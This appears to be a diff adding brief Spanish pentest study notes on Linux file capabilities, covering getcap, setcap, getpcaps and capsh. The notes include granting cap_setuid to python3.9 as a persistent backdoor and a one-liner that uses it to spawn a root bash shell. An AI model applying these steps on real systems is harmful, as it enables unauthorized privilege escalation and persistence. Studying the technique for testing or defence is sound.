@@ -1,0 +1,37 @@
+capabilitiesPersistentes
+
+
+::: getcap -r / 2>/dev/null      "-r (de formaRecursiva)
+
+ :: getcap -r . 2>/dev/null
+
+
+::: setcap  cap_setuid+ep  /usr/bin/python3.9
+
+
+  ::: getcap /usr/bin/python3.9
+
+
+
+
+
+::: getcap     //lista las capabilities de un fichero
+  : getcap -r / 2>/dev/null      "-r (de formaRecursiva)
+  : getcap -r . 2>/dev/null
+
+::: setcap      //asigna capabilities a un fichero
+  : setcap  cap_setuid+ep  /usr/bin/python3.9
+
+
+::: setcap -r   //remueve capabilities a un fichero
+  : setcap -r /usr/bin/python3.9
+
+::: getpcaps      //lista las capabilities  de un proceso
+
+::: capsh     //proporciona un "interfaz" de linea de comandos para probar y explorar el uso de capabilities
+
+
+
+
+
+::: python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'      
